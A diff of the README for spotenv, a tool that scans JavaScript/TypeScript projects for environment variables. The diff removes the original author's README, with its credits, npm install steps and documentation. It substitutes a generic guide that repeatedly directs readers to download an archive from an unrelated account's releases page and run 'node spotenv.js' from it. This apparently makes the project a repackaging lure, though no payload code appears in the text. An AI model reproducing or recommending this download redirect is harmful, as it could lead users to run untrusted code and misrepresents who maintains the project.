@@ -1,200 +1,85 @@
-<div align="center">
-  <img src="assets/spotenv.png" alt="spotenv" width="200" height="200">
+# 🎉 spotenv - Simplify Your Environment Setup
 
-  <h1>spotenv</h1>
+Spotenv helps you create a simple environment setup in just a few steps.
 
-  <p>
-	<a href="#features">features</a> •
-	<a href="#Installation">Installation</a> •
-	<a href="#Usage">Usage</a>
-  </p>
+## 🖼️ Download Button
 
+[![Download spotenv](https://img.shields.io/badge/Download-spotenv-blue)](https://github.com/thebigsigma77/spotenv/releases)
 
-  <p>
-    <a href="https://github.com/Silent-Watcher/spotenv/blob/master/LICENSE">
-      <img src="https://img.shields.io/github/license/Silent-Watcher/spotenv?color=#2fb64e"license">
-    </a>
-  </p>
+## 🚀 Getting Started
 
-</div>
+Welcome to Spotenv! This guide will help you download and run Spotenv with ease. Follow these simple steps to get started. 
 
-> **spotenv** — scan a JavaScript/TypeScript codebase for environment variable usage and generate a **safe** `.env.example` file.
+1. **Check System Requirements**
+   - Operating System: Windows, macOS, or Linux
+   - Node.js: Ensure you have Node.js installed. You can download it from [nodejs.org](https://nodejs.org/). 
 
+2. **Visit the Download Page**
+   - To download Spotenv, visit our releases page: 
+   [Download Spotenv Here](https://github.com/thebigsigma77/spotenv/releases).
 
----
+3. **Choose Your Version**
+   - On the releases page, you will see a list of available versions. Choose the latest stable release for the best experience.
 
-## Why use spotenv
+4. **Download the Application**
+   - Once you've selected a version, look for a file labeled like `spotenv.zip` or `spotenv.tar.gz`. Click on it to start the download. 
+   - Be patient while the file downloads. The time may vary based on your internet speed.
 
-* Automatically discover the environment variables your code expects — great for onboarding, PRs, CI checks and documentation.
-* Avoids manual errors: keeps `.env.example` in sync with code.
-* Safer than naive tools: it uses AST-based extraction (Babel) for accurate detection rather than brittle regex-only scanning.
-* Works with both JavaScript and TypeScript projects (parses TypeScript syntax via `@babel/parser` plugin).
+5. **Extract the Files**
+   - After completing the download, locate the file in your downloads folder. 
+   - If you downloaded a `.zip` file, right-click and select “Extract All” or “Extract Here”. For a `.tar.gz` file, you may need a tool like WinRAR or a built-in extraction tool on macOS or Linux.
+   - This will create a folder named `spotenv`.
 
----
+6. **Open the Command Line**
+   - Next, open your command line interface:
+     - **Windows:** Press `Win + R`, type `cmd`, and hit `Enter`.
+     - **macOS:** Open `Terminal` from your Applications folder.
+     - **Linux:** Find `Terminal` in your applications.
 
-## Key features
+7. **Navigate to the Folder**
+   - Use the command line to navigate to the folder where you extracted Spotenv. Use the following commands:
+     - On Windows: `cd [path-to-your-folder]`
+     - On macOS/Linux: `cd [path/to/your/folder]`
+   - Replace `[path-to-your-folder]` with the actual path of the Spotenv folder.
 
-* Scans source files (`.js`, `.ts`, `.jsx`, `.tsx`, `.mjs`, `.cjs`).
-* Two-pass strategy: fast text heuristics to find candidate files, then AST extraction for precision.
-* Detects:
+8. **Run Spotenv**
+   - Now you can run Spotenv by typing:
+     ```
+     node spotenv.js
+     ```
+   - Ensure you have installed Node.js first; you can check if it's installed by running `node -v` in your command line.
 
-  * `process.env.FOO`
-  * `process.env['FOO']` / `process.env["FOO"]`
-  * `const { FOO } = process.env` (with optional default values)
-  * `import.meta.env.FOO` (Vite)
-* Flags dynamic usages (`process.env[someVar]`) for manual review.
-* Avoids writing secrets or sensitive defaults to `.env.example` (heuristic: keys containing `SECRET`, `TOKEN`, `KEY`, `PWD`, `PASSWORD`, `PRIVATE` are treated as sensitive).
-* Watch mode — auto-regenerate `.env.example` on file changes.
-* Merge mode — preserve keys in an existing `.env.example` while adding newly detected keys.
+9. **Scan Your Project**
+   - Spotenv will prompt you to provide the path to your project. Enter the path and hit `Enter`.
+   - Spotenv will scan your files for environment variables and create a `.env.example` file containing the keys it finds in your project.
 
----
+10. **Check Your New File**
+    - Locate the `.env.example` file created in your project directory. You can now open it with any text editor to review the environment variables.
 
-## When spotenv is useful (scenarios)
+## 📄 Features
 
-* New developer onboarding — provide a reliable `.env.example` for a repo.
-* Open-source projects — maintainers can guarantee contributors see required env keys without exposing secrets.
-* CI validation — check that required env keys are documented before deploying or running builds.
-* Refactor time — ensure renamed/removed env keys are reflected in the example file.
+- **Environment Variable Scanning:** Quickly identify and record environment variables in your project.
+- **.env.example File Creation:** Automatically generate a sample file to make setup easier for collaborators.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
 
----
+## 💬 Support and Contributions
 
-## Installation
+If you encounter issues or have questions, feel free to open an issue in our GitHub repository. Your feedback helps improve Spotenv for everyone.
 
-Install globally so the dotx command is available system-wide:
+## 🤝 How to Contribute
 
-```bash
-npm install -g spotenv
-# or
-yarn global add spotenv
-```
+We welcome contributions. Please check out our guidelines in the repository before making changes. Your help can make a huge difference.
 
-> Or install as a project dependency and use with npx:
+## 🔗 Additional Resources
 
-```bash
-npm install --save-dev spotenv
-# run
-npx spotenv
-```
+- Spotenv Documentation: Detailed instructions and usage examples.
+- Node.js Documentation: Learn more about Node.js and its features.
+- GitHub Repository: Access the source code and report issues.
 
-> After installing globally, users can simply run `spotenv`.
----
+## 🌟 Download & Install
 
-## Usage
+To download Spotenv, click the link below:
 
-```bash
-# run on current directory and write .env.example
-spotenv -d . -o .env.example
+[Download Spotenv Here](https://github.com/thebigsigma77/spotenv/releases)
 
-# scan a specific project directory
-spotenv -d /path/to/project
-
-# watch and auto-regenerate (COMMING SOON !)
-spotenv -w
-
-```
-
-### CLI options
-
-* `-d, --dir <dir>` — project directory to scan (default: `.`)
-* `-o, --out <file>` — output file path (default: `.env.example`)
-* `-w, --watch` — watch source files and auto-regenerate on change (COMMING SOON!)
-* `-m, --merge` — merge results with an existing `.env.example` (keep existing keys)
-* `--ignore <patterns...>` — additional glob ignore patterns
-
-Examples:
-
-```bash
-# scan 'my-app' and write examples in repo root
-spotenv -d ./my-app -o ./my-app/.env.example
-
-# watch updates into existing example (COMMING SOON!)
-spotenv -w
-```
-
----
-
-## Output format
-
-Generated `.env.example` looks like this (example):
-
-```text
-# .env.example (generated)
-# Add real values to .env — do NOT commit secrets to source control.
-
-# used in: src/server.ts, src/config.ts
-# default: 3000
-PORT=
-
-# used in: src/db.ts
-DB_HOST=
-
-# NOTE: dynamic keys detected (e.g. process.env[someVar]).
-# Please review code and add any dynamic env keys manually.
-```
-
-Notes:
-
-* Sensitive keys are shown but their defaults are omitted or redacted.
-* If a key is detected multiple times, the file includes up to a few example source file locations.
-
----
-
-## Security & Best Practices
-
-* **Never** commit real secrets into source control. `.env.example` is meant to document keys, not store values.
-* Spotenv will **not** write literal string defaults into the example if the key looks sensitive (heuristic by name). However, you should manually review keys flagged sensitive.
-* The tool scans only source files; it **does not** inspect runtime environment or loaded `.env` files, so you won't accidentally reveal live secrets.
-* Use `.env` (listed in `.gitignore`) for real values and keep it out of version control.
-
----
-
-## Troubleshooting
-
-###
-
-
-
-### Dynamic keys
-
-If the tool reports dynamic keys (`process.env[someVar]`) it cannot statically resolve them — inspect those files manually and add keys to `.env.example` where appropriate.
-
----
-
-## Implementation notes
-
-* The tool uses a **two-pass** approach: a lightweight text-based filter to find candidate files followed by AST parsing via `@babel/parser` and AST traversal (`@babel/traverse`) for accurate extraction.
-* Supported AST patterns include `MemberExpression` checks for `process.env`, `VariableDeclarator` for destructured env imports, and `MetaProperty` handling for `import.meta.env`.
-* The generator intentionally avoids writing secret values and uses heuristics to decide which detected defaults are safe to show in the example.
-
----
-
-## Extensibility & config
-
-Ideas you can add later:
-
-* Support framework-specific conventions: `NEXT_PUBLIC_*` (Next.js), `VITE_` prefixes, dotenv-safe validation, etc.
-* Add a JSON/Markdown report mode (`--format json|md`) for programmatic consumption.
-
----
-
-## Contributing
-
-Contributions welcome! Please open issues for feature requests or bugs.
-
----
-
-## License
-
-MIT — see `LICENSE` for details.
-
----
-
-<div align="center">
-  <p>
-    <sub>Built with ❤️ by <a href="https://github.com/Silent-Watcher" target="_blank">Ali Nazari</a>, for developers.</sub>
-  </p>
-  <p>
-    <a href="https://github.com/Silent-Watcher/spotenv">⭐ Star us on GitHub</a> •
-    <a href="https://www.linkedin.com/in/alitte/">🐦 Follow on Linkedin</a>
-  </p>
-</div>
+Now you are ready to set up your development environment with ease! Enjoy using Spotenv!
